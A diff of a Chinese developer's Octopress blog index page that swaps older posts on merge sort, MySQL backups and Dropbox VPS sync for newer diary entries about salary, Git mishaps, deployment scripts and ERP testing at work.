@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="今天看到算法导论上关于求解一个序列的逆序对的问题，以前自己在这个地方写着解答方法，不过今天怎么看都不懂了，从网上找了找，大都说得很模糊，不过自己突然有种领悟了的感觉，找了个简单的例子，实验了一下，自己的结论是正确的：） 例子是（2，3，8，6，1）这个序列，找出所有的5个逆序对。 &hellip;">
+	<meta name="description" content="刚刚还在盼着工资到账呢，结果都十点多了，估计都睡了吧，我又对于肉包子事件愤愤不平，所以就开始bloging了，写了不少，突然看到95568来的短信，一般都是资金变动，果然工资到账了，扣除了15块的个税。这一下子就体验到了缴税的感觉，个税3500起征，我交了多出来的那500块税钱，按照3%算， &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,70 +79,14 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/07/solve-inversion-by-using-merge/">
+		<a href="/blog/2012/11/01/firstly-scottare/">
 		
-			逆序对的求解</a>
+			Firstly Scottare</a>
 	</h2>
 	<div class="entry-content">
-		<p>今天看到算法导论上关于求解一个序列的逆序对的问题，以前自己在这个地方写着解答方法，不过今天怎么看都不懂了，从网上找了找，大都说得很模糊，不过自己突然有种领悟了的感觉，找了个简单的例子，实验了一下，自己的结论是正确的：）</p>
+		<p>刚刚还在盼着工资到账呢，结果都十点多了，估计都睡了吧，我又对于肉包子事件愤愤不平，所以就开始bloging了，写了不少，突然看到95568来的短信，一般都是资金变动，果然工资到账了，扣除了15块的个税。这一下子就体验到了缴税的感觉，个税3500起征，我交了多出来的那500块税钱，按照3%算，就是15。</p>
 
-<p>例子是（2，3，8，6，1）这个序列，找出所有的5个逆序对。最好的方法是nlogn复杂度的利用归并排序的副产品——merge部分统计，统计比较左右列表时，左侧大于右侧时“左侧”列表中剩余数目。</p>
-
-<p>归并的划分应该是这样的，（2，3，8）为左侧，（6，1）为右侧，继续划分为（2，3）和8，右边是6和1。下面就开始合并了，（2，3）和8这边还是（2，3，8），右侧出现一个逆序对，在合并6，1的时候因为作为“左侧”的6要大于1，所以这里有1个逆序对，这里的1就是此时“左侧”序列中的元素个数。</p>
-
-<p>在往下走，要合并（2，3，8）和（1，6），马上就出现了2&gt;1这样的情况，此时会出现（2，1）、（3，1）、（8，1）这几个逆序对，后面还会出现（8，6）这个逆序对，一共就这么5个。</p>
-
-<p>因为原始序列是（2，3，8，6，1），我们需要用到这个原始序列的顺序来判断顺序排在前面的值却大于后面的，这样的机会在每次merge的时候是非常合适的。</p>
-
-<p>这是修改后输出逆序对的归并排序算法，有点可惜哈，这么长的排序算法只让副产品在台前显露了一把！</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
-
-def merge(arraylist, first, middle, last):
-   temp = []
-   i = first
-   j = middle + 1
-   while i &lt;= middle and j &lt;= last:
-       if arraylist[i] &lt;= arraylist[j]:
-           temp.append(arraylist[i])
-           i += 1
-       else:
-           for x in arraylist[i:middle + 1]:
-               print "(%d,%d)" % (x, arraylist[j])
-           temp.append(arraylist[j])
-           j += 1
-   while i &lt;= middle:
-       temp.append(arraylist[i])
-       i += 1
-   while j &lt;= last:
-       temp.append(arraylist[j])
-       j += 1
-   for i in range(0, last - first + 1):
-       arraylist[first + i] = temp[i]
-
-def merge_sort(arraylist, first, last):
-   if first &lt; last:
-       middle = (first + last) / 2
-       merge_sort(arraylist, first, middle)
-       merge_sort(arraylist, middle + 1, last)
-       merge(arraylist, first, middle, last)
-
-if __name__ == "__main__":
-lst = [2,3,8,6,1]
-merge_sort(lst, 0, len(lst) - 1)</pre>
-
-
-<p>运行结果：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">(6,1)
-(2,1)
-(3,1)
-(8,1)
-(8,6)</pre>
-
-
-<p>（我的代码缩进似乎出了点问题，本身这段归并排序也是从网上找来的，所以混合了不少tab和whitespace，弄了好久都是error indent，最后我无奈用whitespace来做缩进，好歹调试通过了！）</p>
+<p>现在过两天收我房租我也不怕了，有了backup，生活又要美好起来了。。。</p>
 
 		
 		
@@ -162,11 +106,11 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
   
 
 
-<time datetime="2012-05-07T17:08:00+08:00" pubdate data-updated="true">May 7<span>th</span>, 2012</time></div>
+<time datetime="2012-11-01T23:22:00+08:00" pubdate data-updated="true">Nov 1<span>st</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/gui-bing-pai-xu/'>归并排序</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/ni-xu-dui/'>逆序对</a>
+	<a class='category' href='/blog/categories/life/'>life</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -178,18 +122,20 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/06/miserable-code-jam-2012/">
+		<a href="/blog/2012/11/01/git-mass/">
 		
-			悲惨的CodeJam2012</a>
+			Git Mass</a>
 	</h2>
 	<div class="entry-content">
-		<p>资格赛晋级之后还稍稍得到了点自信，起码原来只能远观CodeJam的我现在也能继续走进看看了，不过家下来的Round1三场比赛直接被虐杀了，每一场都是最后，每个题都做不出来，说出来也是很惭愧的，但得承认自己这点能力，有人不到5分钟就能做对一个大题，而我5分钟可能都没读完题，更别说写代码了。</p>
+		<p>原本以为今天能上线给编辑们使用，结果只是找了编辑部的几个人来现场的开发环境中玩了玩，提了提意见，明天下午1点我们正式开始用生产环境。</p>
 
-<p>但最重要的是理解题目，能够理解了也就完成了90%，剩下的工作就是coding的过程，参加比赛的人基本都是有备而来，各种模版、脚本都准备好了，写起来非常快。对于非英语系国家的选手来说，读题似乎是很大的障碍，起码会比别人慢好多倍，这点只能多多看英文的资料来弥补了！</p>
+<p>今天我又部署了好几次，期间也出现过一些问题，但都一一修复了，比较大的就是我把Git搞乱了，让周围几个人突然陷入困境。其实是我在生产分支上做了改动，发现应该去master做，结果我就跳到master上想要合并生产分支，后来被我不断rebase弄坏了，处于一种无分支所在的状况，taowen帮我reset到了之前的地方，还好改动不多，又凭记忆修复过来了。看来部署这个东西真不能让一个人来搞定，一合并就会出现不少冲突，有的你能解决，有的解决不了（现在还没遇到解决不了的）。</p>
 
-<p>今天的Round1第三场出现了两个动态规划的题，感觉知道了怎么做可就是不会写，我也就是停留在知道有动态规划这种变态方法的层面上，真让我写出来可不行，抱着《算法导论》看了半天也是毫无头绪……</p>
+<p>上午的standup持续了好久，大概又是在讨论需不需要这么多生产环境的纪律，昨天taowen只是加了commit前需要self-check，现在又出现了一个component不能超过xxx行的纪律，而且自动算出来，如果超了你就无法commit，wanglei今天早晨中招，顺便就开始说这个事儿了，我猜等我要做别的东西的时候也会这样吧。</p>
 
-<p>毕竟不是Acmer，咱也就只能止步于此啦！希望进入下一轮的国人们继续加油！</p>
+<p>backup、restore、restore-from-baseline这几个虽然看起来简单，但调试起来缺不怎么容易，而且在调试过程中还出现了不少突发问题，解决起来也是相当费时间的，现在部署后再做这些工作应该都没什么问题了。</p>
+
+<p>晚上回来后我把web service的检查加入到了setting中，把部署打tag加入到了deploy流程中。明天去了打算把部署前lock所有sql脚本加入进去，这样每次部署就需要和大家说一下了。</p>
 
 		
 		
@@ -209,11 +155,11 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
   
 
 
-<time datetime="2012-05-06T21:49:00+08:00" pubdate data-updated="true">May 6<span>th</span>, 2012</time></div>
+<time datetime="2012-11-01T21:56:00+08:00" pubdate data-updated="true">Nov 1<span>st</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/code-jam/'>Code jam</a>, <a class='category' href='/blog/categories/zhe-si/'>哲思</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -225,14 +171,22 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/06/webpy-frameworks-is-not-convinent-to-use/">
+		<a href="/blog/2012/10/31/tomorrow-internal-test/">
 		
-			web.py真不好用</a>
+			Tomorrow Internal Test</a>
 	</h2>
 	<div class="entry-content">
-		<p>本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的，api只是写出来了，但基本都不说是什么作用，想清楚知道运行机制那就得看源代码了，还好不“那么”长！</p>
+		<p>也不知道怎么的，明天竟然就要内部测试了，首先是让编辑们录入商品，然后逐渐开始上一些主题、促销什么的东西，后者还没有时间表，不过从星期一就知道了星期四开始正式录入商品，也就是说我们的数据库从星期四就不能再drop了，只能migrate。</p>
 
-<p>哎，暂时就放一下web.py吧！到头来过度依赖框架绝对不是什么好事，嗯，不是什么好兆头现在的我！</p>
+<p>今天我们每个人都开始了带生产环境下的开发，一切操作都和上线了一样，包括提交之前必须有测试跑过才可以提交，这里被taowen监视着安装了一个hook，如果不跑一遍测试，根本没办法commit。还有数据库的baseline无法再被修改，这里也有一个licked文件管理着，如果需要修改只能migrate到baseline才可以。</p>
+
+<p>部署方面今天我做了几个脚本方便使用——backup、restore、restore-from-baseline，分别是备份、恢复、远程恢复，备份既可以是server来做，也可以自己来做，只是自己做这个似乎没什么必要，server会自动在4点的时候备份一下var目录，远程恢复就是回复一个server的备份到本地开发使用。</p>
+
+<p>今天还熟悉了一下tar的使用，现在是用tar打包，顺便压缩成了gz，所以打包需要czf参数，之所以这样排序是因为f参数后面是要跟着tar.gz文件名作为参数的，以前我以为随便排序，现在想想好傻啊。今天还遇到一个小问题，tar打包的时候如果你给出的路径是绝对的，那么打包也会从头开始帮你打包，比如你给了一个从根分区到你要打包目录的路径，那么打包完了，也是从根分区开始，恢复起来比较讨厌，此时需要一个C参数，大写C，Ta可以让你的工作目录Change到一个地方去，这样你就能在打包的时候把工作目录移动到需要的地方，这样就能不带那么长的路径了，当然解包的时候同样需要C参数指定好位置。</p>
+
+<p>restore-from-baseline那里还有点问题，没有做测试找出漏洞，只能明天再去试试了，还有就是在部署的时候supervisor的配置文件有错误，导致web部署出问题，我看了看改起来比较费劲，让taowen干掉吧明天。</p>
+
+<p>明天，可能会很紧张吧：）</p>
 
 		
 		
@@ -252,11 +206,11 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
   
 
 
-<time datetime="2012-05-06T16:31:00+08:00" pubdate data-updated="true">May 6<span>th</span>, 2012</time></div>
+<time datetime="2012-10-31T21:35:00+08:00" pubdate data-updated="true">Oct 31<span>st</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/webpy/'>webpy</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -268,16 +222,18 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/02/mysql-issue/">
+		<a href="/blog/2012/10/27/erp/">
 		
-			网站都挂掉了</a>
+			Erp</a>
 	</h2>
 	<div class="entry-content">
-		<p>突然发现mysql无法用localhost连接进去，而用127.0.0.1可以。</p>
+		<p>终于把erp的所有接口测试完了，其中仍然不乏几个要命错误，只好记录下来发给开发方，又将是漫长的等待。</p>
 
-<p>linux下是这样的，如果用localhost连接是走的socket路线，用127.0.0.1走的是tcp路线。</p>
+<p>王总终于还是看不惯我们专业人士用的一些词汇和设计出来的使用流程，他似乎希望身边即便是初中毕业的员工都能自由使用我们开发的系统，这点有些像Jobs不是么，很可惜我们在做的产品不是面向广大用户，而是他的人数有限的编辑们，有时候我就怀疑需不需要这么人性化的设计。</p>
 
-<p>修改了php.ini中的mysql.default_socket，值为mysql.sock的文件路径，重启php就好了，不过phpmyadmin的问题依然没有解决，我只是把连接主机换成了127.0.0.1暂时用着。</p>
+<p>taowen又把网站的架构修正了一番，这次改动似乎稍大，我更新了代码发现数据库帐号密码不对，经过邮件咨询，说删掉var重新install一遍能搞定，我又试了一次，这次直接提示数据库找不到，看来真陷入困境了。</p>
+
+<p>今天上午姐姐请我去吃饭，我也没法fix这边的问题，下午回来又和豪猪碰面，帮他洗了几件衣服后出去海吃了一顿，羊蝎子，这个星期的油水满了，明天如果能把热水器fix了我就很满足了，要不然又要无休止的拖下去。我讨厌任何的拖延，并且认识到拖延和蝴蝶效应是伴生关系，一拖延影响的事情会逐渐影响后来的很多事，让你抓狂。</p>
 
 		
 		
@@ -297,11 +253,11 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
   
 
 
-<time datetime="2012-05-02T18:17:00+08:00" pubdate data-updated="true">May 2<span>nd</span>, 2012</time></div>
+<time datetime="2012-10-27T21:57:00+08:00" pubdate data-updated="true">Oct 27<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/socket/'>socket</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>, <a class='category' href='/blog/categories/life/'>life</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -313,45 +269,57 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/27/backup-mysql-databases-using-python/">
+		<a href="/blog/2012/10/25/orange-has-been-sweet/">
 		
-			用python备份mysql</a>
+			Orange Has Been Sweet</a>
 	</h2>
 	<div class="entry-content">
-		<p>备份数据库的重要性不想多说了。</p>
+		<p>今天早晨买了一些水果，也买了几个橙子，虽然不便宜，但今晚上吃起来感觉还不错，挺甜的。</p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
+<p>怎么总感觉今天有点儿不稳呢，听说ERP的接口搞定了就要去测试了，测试过程不怎么顺利，让别人做事情，而且相隔很远，再加上对方不怎么关心这个有点陈旧的系统，工作就会很难同步，我们一测试就出问题，报告过去后好久才给我改改，再测试，又出问题。目前来看虽然没有完全测试好，但已经暴露出几个问题了，还是比较重要的。</p>
 
-import os
-import sys
-from datetime import *
-import time
+<p>明天需要继续测试剩下的接口，并且要总结问题，发给郑工处理处理，又是漫长的等待，这是必然的，不仅仅是一个周末，估计这块在上线前都会是很紧张的。</p>
 
-#mysql's path
-mysql_path = '/usr/local/mysql/bin/'
-#edit this if your mysql username and password is not like this:
-mysql_username = 'root'
-mysql_password = 'xxxxxx'
-#backup path
-backup_path = 'mysqlbackup/'
+<p>这篇文章发表得不容易，generate的时候总出现一个错误:</p>
 
-def validate_backup_path():
-if os.path.exists(backup_path) == False:
-print "I create a directory here: %s " % backup_path
-os.mkdir(backup_path)
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/Users/dawncold/.rvm/rubies/ruby-1.9.3-p286/lib/ruby/1.9.1/psych.rb:203:in <span class="sb">`</span>parse<span class="s1">&#39;: (&lt;unknown&gt;): control characters are not allowed at line 1 column 1 (Psych::SyntaxError)</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/.rvm/rubies/ruby-1.9.3-p286/lib/ruby/1.9.1/psych.rb:203:in `parse_stream&#39;</span>
+</span><span class='line'>  from /Users/dawncold/.rvm/rubies/ruby-1.9.3-p286/lib/ruby/1.9.1/psych.rb:151:in <span class="sb">`</span>parse<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/.rvm/rubies/ruby-1.9.3-p286/lib/ruby/1.9.1/psych.rb:127:in `load&#39;</span>
+</span><span class='line'>  from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/gems/jekyll-0.11.2/lib/jekyll/convertible.rb:33:in <span class="sb">`</span>read_yaml<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/gems/jekyll-0.11.2/lib/jekyll/post.rb:39:in `initialize&#39;</span>
+</span><span class='line'>  from /Users/dawncold/Documents/Project/work_at_honovation/plugins/preview_unpublished.rb:23:in <span class="sb">`</span>new<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/Documents/Project/work_at_honovation/plugins/preview_unpublished.rb:23:in `block in read_posts&#39;</span>
+</span><span class='line'>  from /Users/dawncold/Documents/Project/work_at_honovation/plugins/preview_unpublished.rb:21:in <span class="sb">`</span>each<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/Documents/Project/work_at_honovation/plugins/preview_unpublished.rb:21:in `read_posts&#39;</span>
+</span><span class='line'>  from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/gems/jekyll-0.11.2/lib/jekyll/site.rb:128:in <span class="sb">`</span>read_directories<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/gems/jekyll-0.11.2/lib/jekyll/site.rb:98:in `read&#39;</span>
+</span><span class='line'>  from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/gems/jekyll-0.11.2/lib/jekyll/site.rb:38:in <span class="sb">`</span>process<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/gems/jekyll-0.11.2/bin/jekyll:250:in `&lt;top (required)&gt;&#39;</span>
+</span><span class='line'>  from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/bin/jekyll:23:in <span class="sb">`</span>load<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1"> from /Users/dawncold/.rvm/gems/ruby-1.9.3-p286/bin/jekyll:23:in `&lt;main&gt;&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
 
-def backup_all_databases():
-filename = "all_%s.sql" % (datetime.utcfromtimestamp(time.time()))
-os.system("%smysqldump -u%s -p%s --all-databases &gt; '%s%s'" % (mysql_path, mysql_username, mysql_password, backup_path, filename))
 
-if __name__ == "__main__":
-validate_backup_path()
-backup_all_databases()
-print "finish!!!"</pre>
+<p>这种错误找起来真是蛋疼，最终是在dev这个字符开始的地方找到的，有个奇怪的字符出现了，看不到，也不占空，但确实有个字符在那里占着地方，或许是输入法在切换的时候遗留到那里的吧。。。可恶！</p>
 
-
-<p>这个是修改了一次的备份脚本，本来是分数据库备份的，无奈制定了分数据库备份需要输入密码，这就不容易加入cron来自动完成了，不过听说在my.cnf中加入mysqldump的设置可以避免输入账号密码，这也算是一个办法吧，不过还是本着简化的思想，只导出所有数据库出来就好，配合着上一篇的dropbox自动备份，这样VPS的灾备就稍稍好些了：）</p>
+<p>明天还有新工作，测试完ERP后继续做CMS，王总提出了不少新的东西要改进。</p>
 
 		
 		
@@ -371,11 +339,11 @@ print "finish!!!"</pre>
   
 
 
-<time datetime="2012-04-27T20:44:00+08:00" pubdate data-updated="true">Apr 27<span>th</span>, 2012</time></div>
+<time datetime="2012-10-25T21:04:00+08:00" pubdate data-updated="true">Oct 25<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/backup/'>backup</a>, <a class='category' href='/blog/categories/crontab/'>crontab</a>, <a class='category' href='/blog/categories/dropbox/'>dropbox</a>, <a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>, <a class='category' href='/blog/categories/life/'>life</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -387,85 +355,18 @@ print "finish!!!"</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/27/auto-backup-data-in-vps-using-python-script-to-control/">
+		<a href="/blog/2012/10/25/almost-fullfil/">
 		
-			dropbox自动备份VPS</a>
+			Almost Fullfil</a>
 	</h2>
 	<div class="entry-content">
-		<p>在<a href="http://www.deepvps.com/dropbox-backup.html" target="_blank">这里</a>看过的文章，感觉很不错，于是发表过来，但发现有点问题，我就自己再改改。</p>
+		<p>昨晚洗完澡后想继续把白天没做完的tag list block做完，没想到阿敏跳出来让我看她最近的摄影作品，看着真不像她拍得东西，整个画面已经不是全都清楚了，该清楚的地方清楚，其余地方模糊。我早就这样和她说过，她还总不相信，现在上了摄影课才知道。</p>
 
-<p>安装linux下的dropbox（我的是32为系统，如果是64位在下面地址末尾加上“_64”即可）：</p>
+<p>渐渐发现我已经做完tag list的功能了，只是现在给了一个固定的宽高，所以没有匹配到product list这个block，可以加图片或者幻灯片进去，好吧，现在工作似乎简单了不少，马上push了代码准备记录一下，一看已经过了10点。还是想养成早睡早起而不是晚睡早起的习惯，那就睡了吧。</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">wget -O dropbox.tar.gz http://www.dropbox.com/download?plat=lnx.x86</pre>
+<p>估计今天会和taowen先把昨天没做好的block隐藏功能做好，然后就能继续向着medium、small category开进。</p>
 
-
-<p>解压后在.dropbox-dist目录中有dropboxd可执行文件，让其在后台执行（就是在执行文件后面加“&amp;”符号）</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">~/.dropbox-dist/dropboxd &amp;</pre>
-
-
-<p>此后会出现一个地址，你得复制出来然后在浏览器中打开，之后就是注册或者登陆dropbox，这样就激活了在这台机器上的dropbox，就可以同步文件了。</p>
-
-<p>把需要同步备份的文件软连接到Dropbox这个目录中：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">cd ~/Dropbox
-ln -s /home/wwwroot/
-。。。</pre>
-
-
-<p>此时dropbox已经在帮你同步了，你可以通过web端观察。</p>
-
-<p>我看到的文章中带着一个自动运行的脚本，用sh写的，我发现在主机上运行没反应，不会sh，会点python，于是我改写了一下，也是可用的：</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
-
-import sys
-import os
-
-def start():
-print "Starting Dropbox..."
-os.system("~/.dropbox-dist/dropboxd &amp;")
-
-
-def stop():
-print "Stoping Dropbox..."
-os.system("pkill dropbox")
-
-
-def restart():
-stop()
-start()
-
-
-if __name__ == "__main__":
-action = sys.argv[1]
-print "now action: %s" % action
-if action == 'start':
-start()
-elif action == "stop":
-stop()
-elif action == "restart":
-restart()
-else:
-print "Bad arguments!"</pre>
-
-
-<p>相应的crontab配置文件中这样写就好了：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">#auto dropbox
-0 4 * * * python /root/dropbox.py restart
-0 5 * * * python /root/dropbox.py stop</pre>
-
-
-<p>如果没装crontab（极少情况），这样(也许你用apt-get来做这件事，我的是centos系统，用yum了)：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">yum -y install crontab</pre>
-
-
-<p>python让我很快乐：）</p>
-
-<p>一开始在python用的是exec来执行命令发现不可用，于是用了os.system，查看pydoc才发现exec是执行python code用的……惭愧！</p>
+<p>昨天中午看了一个视频，全英文，还是Domain Design，讲了一些在旧系统重构到新系统的技巧，并且如何使用Domain Design，大概能看懂20~30%，英语继续练习吧，实在不行我就把blog改成英文版！！！</p>
 
 		
 		
@@ -485,11 +386,11 @@ print "Bad arguments!"</pre>
   
 
 
-<time datetime="2012-04-27T17:51:00+08:00" pubdate data-updated="true">Apr 27<span>th</span>, 2012</time></div>
+<time datetime="2012-10-25T06:52:00+08:00" pubdate data-updated="true">Oct 25<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/dropbox/'>dropbox</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -501,62 +402,16 @@ print "Bad arguments!"</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/20/grub-table-from-html-using-pything/">
+		<a href="/blog/2012/10/23/new-task/">
 		
-			抓取一些网页上的表格</a>
+			New Task</a>
 	</h2>
 	<div class="entry-content">
-		<p>这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：）</p>
+		<p>昨天就开始做user center这样一个功能，说简单也简单，至少是从表现上来看很简单，不过也挺重要的，几乎每个电商网站都有一个说得过去的user center，至少要让用户能在这里查询订单什么的。我们这个user center同样参考了不少网站的产品原型，但由于是上线初期，很多功能无法完善，最终呈现给用户的就三四个功能（还有一个是纯粹展示一段文字用的……）</p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#/usr/bin/env python
-#coding: utf-8
+<p>但很可惜，犹豫center的功能性，需要和订单、用户地址、用户信息等功能衔接，有位同事正在搞下单功能，我看到有些地方需要修改，改好后push过去，一会又和那位同事冲突了，这样就很难推进下去了，如果同事在身边还好，可惜不在。</p>
 
-import urllib2
-import re
-import xlwt
-
-link_list = []
-xls = xlwt.Workbook()
-table = xls.add_sheet("main")
-
-for i in xrange(288, 318):
-link_list.append("http://www.lanqiao.org/Article/ShowArticle.asp?ArticleID=%d"%i)
-
-chinese = []
-content = ''
-while len(link_list) &gt; 0:
-for link in link_list:
-print link
-try:
-content = urllib2.urlopen(url = link, timeout = 3).read()
-link_list = link_list[1:]
-except:
-print "timeout!"
-if link not in link_list[1:]:
-link_list.append(link)
-some = re.findall(u'&lt;TR.*?&lt;\/TR&gt;', content.decode('gbk', 'ignore'), re.S)
-for s in some:
-chinese_value = re.findall(u'(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)', s)
-chinese.append(','.join(chinese_value))
-
-for line in xrange(0, len(chinese)):
-tmp = chinese[line].split(',')
-for i in xrange(0, len(tmp)):
-table.write(line, i, tmp[i])
-print "%d, %d, %s" % (line, i, tmp[i])
-
-xls.save('x.xls')
-print len(link_list)</pre>
-
-
-<p>链接抓取超时的时候会自动重新抓取，最终就有了一个叫x.xls的表格。其中有个省的数据有问题，可以在筛选中看到奖项这里面有个垃圾数据项，自己改改吧。</p>
-
-<p>里面的正则表达式耗费了我好久时间！！！不过我还是很欣慰能找到这行：</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)</pre>
-
-
-<p>前面两个unicode是“宋体”，这个得看具体的html代码了，所以这个脚本没什么通用性……</p>
+<p>余下一点时间讨论了large category、medium category、small category的效果，明天会先解决ERP下单问题，接着就是按照今天讨论的效果来实现category。大致看了一下diapers.com的实现代码，不那么难，但做到兼容IE的话我还是没底，需要强大前端支持。</p>
 
 		
 		
@@ -576,11 +431,11 @@ print len(link_list)</pre>
   
 
 
-<time datetime="2012-04-20T09:34:00+08:00" pubdate data-updated="true">Apr 20<span>th</span>, 2012</time></div>
+<time datetime="2012-10-23T20:47:00+08:00" pubdate data-updated="true">Oct 23<span>rd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/html/'>html</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/regex/'>regex</a>, <a class='category' href='/blog/categories/table/'>table</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -592,16 +447,24 @@ print len(link_list)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/16/google-code-jam-2012/">
+		<a href="/blog/2012/10/22/we-have-many-snack/">
 		
-			Code Jam 2012</a>
+			We Have Many Snack</a>
 	</h2>
 	<div class="entry-content">
-		<p>资格赛已经结束了，还好做出来几个题，现在来看这些题目都不算是特别有难度，最主要的还是在理解题目的要求，这当然对于我们非英语系国家的人来说是有些困难的，可能我们需要多读几遍题目才能开始编码，这确实有些不利，但最主要的还是理解错了题目，这样才可怕。</p>
+		<p><img src="http://pic.yupoo.com/dawncold0/CmmLLLmW/medish.jpg" alt="many snack" /></p>
 
-<p>第二个题我就理解有些问题，考虑得太多了，看优秀选手的代码，才十几行结束，真是羡慕死我了！！！</p>
+<p>这就是我们现在的零食们，绝大多数是taowen买的，基本是他自己吃，我们也顺便跟着吃一些，今天早晨去的时候和他一共签了6个包裹，大都是零食，还有个是U2412M的外置音箱配件，问他为何买这个，说是上次看视频的时候声音不够大，现在装上确实够大了。</p>
 
-<p>下一轮比赛可能就要在家做了吧？毕竟到了我跑回家的日子：）</p>
+<p><img src="http://pic.yupoo.com/dawncold0/CmmR3iAM/medish.jpg" alt="my small box of snack" /></p>
+
